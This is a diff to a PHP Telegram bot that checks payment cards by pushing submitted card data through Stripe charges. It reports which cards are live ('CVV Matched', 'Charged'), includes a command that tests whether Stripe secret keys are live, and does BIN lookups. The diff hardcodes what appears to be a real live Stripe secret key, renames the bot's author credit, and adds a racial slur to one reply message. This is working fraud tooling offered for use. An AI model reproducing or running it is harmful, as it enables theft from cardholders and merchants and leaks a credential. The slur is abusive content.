@@ -25,7 +25,7 @@ $usernam = ''.$username.'%0A [Owner]';
 else {
 $usernam = $username;
 }
-$sk = 'sk_live_xxxxxxxxx';
+$sk = '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';
 function GetStr($string, $start, $end){
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
@@ -108,12 +108,12 @@ $amt = '1';
         $msg2 = Getstr($result2,'"message": "','"');
         $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
         if(strpos($result2, '"seller_message": "Payment complete."' )) {
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Successfully Charged $$amt ✅</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Successfully Charged $$amt ✅</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 
         }
         elseif(strpos($result2, "insufficient_funds" )) {
         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
-        elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3D Card</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3D Card</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif(strpos($result2,'"cvc_check": "pass"')){
         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
         elseif(strpos($result2,'"code": "incorrect_cvc"')){
@@ -121,23 +121,23 @@ $amt = '1';
         elseif(strpos($result1,'"code": "incorrect_cvc"')){
         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
         elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge $$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge $$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
         }
         elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         
         elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         else {
         sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
         };
@@ -201,35 +201,35 @@ $amt = '100';
         $msg2 = Getstr($result2,'"message": "','"');
         $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
         if(strpos($result2, '"seller_message": "Payment complete."' )) {
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Successfully Charged ₹$amt ✅</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Charged ₹$amt ✅</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
         }
         elseif(strpos($result2, "insufficient_funds" )) {
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» broke nigga</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3D Card</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
         elseif(strpos($result2,'"cvc_check": "pass"')){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif(strpos($result2,'"code": "incorrect_cvc"')){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge ₹$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge ₹$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif(strpos($result1,'"code": "incorrect_cvc"')){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge ₹$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge ₹$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: rellur</b>", $message_id);}
         elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
         }
         elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         
         elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
-        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);}
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);}
         else {
         sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
         };
@@ -267,10 +267,10 @@ $bin = 'Credit';
 }else{
 $bin = 'Debit';
 };
-sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>⋆ Bank:</b> '.$bank.'%0A<b>⋆ Country:</b> '.$name.''.$emoji.'%0A<b>⋆ Brand:</b> '.$brand.'%0A<b>⋆ Card:</b> '.$scheme.'%0A<b>⋆ Type:</b> '.$type.'%0A<b>⋆ Checked By:</b> @'.$username.'%0A%0A<b>⋆ Bot By: GUNNU</b>', $message_id);
+sendMessage($chatId, '<b>✅ Valid</b>%0A<b>⋆ Bank:</b> '.$bank.'%0A<b>⋆ Country:</b> '.$name.''.$emoji.'%0A<b>⋆ Brand:</b> '.$brand.'%0A<b>⋆ Card:</b> '.$scheme.'%0A<b>⋆ Type:</b> '.$type.'%0A<b>⋆ Checked By:</b> @'.$username.'%0A%0A<b>⋆ Bot By: reelur</b>', $message_id);
 }
 else {
-sendMessage($chatId, '<b>❌ Invalid Bin%0AFormat - /bin xxxxxx</b>', $message_id);
+sendMessage($chatId, '<b>❌ Invalid%0AFormat - /bin xxxxxx</b>', $message_id);
 }
 }
 elseif (strpos($message, "/key") === 0){
@@ -288,25 +288,25 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_mon
 $result = curl_exec($ch);
 $response = trim(strip_tags(GetStr($result,'"message": "','"')));
 if (strpos($result, 'tok_')){
-sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> SK LIVE!!%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> SK LIVE!!%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif (strpos($result, 'Invalid API Key provided')){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> INVALID KEY%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> INVALID KEY%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif (strpos($result, 'You did not provide an API key.')){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> No Sk Key Provided%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> No Sk Key Provided%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif (strpos($result, 'rate_limit')){
-sendMessage($chatId, "<b>⚠️ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Rate Limited Key%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>⚠️ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Rate Limited Key%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Testmode Charges Only%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Testmode Charges Only%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif (strpos($result, 'api_key_expired')){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Api Key Expired%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Api Key Expired%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 else{
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> Unknown Error.%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> Unknown Error.%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 }
 else {
@@ -329,25 +329,25 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_mon
 $result = curl_exec($ch);
 $response = trim(strip_tags(GetStr($result,'"message": "','"')));
 if (strpos($result, 'tok_')){
-sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> SK LIVE!!%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> SK LIVE!!%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif (strpos($result, 'Invalid API Key provided')){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> INVALID KEY%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> INVALID KEY%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif (strpos($result, 'You did not provide an API key.')){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> No Sk Key Provided%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> No Sk Key Provided%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif (strpos($result, 'rate_limit')){
-sendMessage($chatId, "<b>⚠️ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Rate Limited Key%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>⚠️ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Rate Limited Key%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Testmode Charges Only%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Testmode Charges Only%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 elseif (strpos($result, 'api_key_expired')){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Api Key Expired%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Api Key Expired%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 else{
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> Unknown Error.%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: GUNNU</b>", $message_id);
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> Unknown Error.%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: reelur</b>", $message_id);
 }
 }
 else {
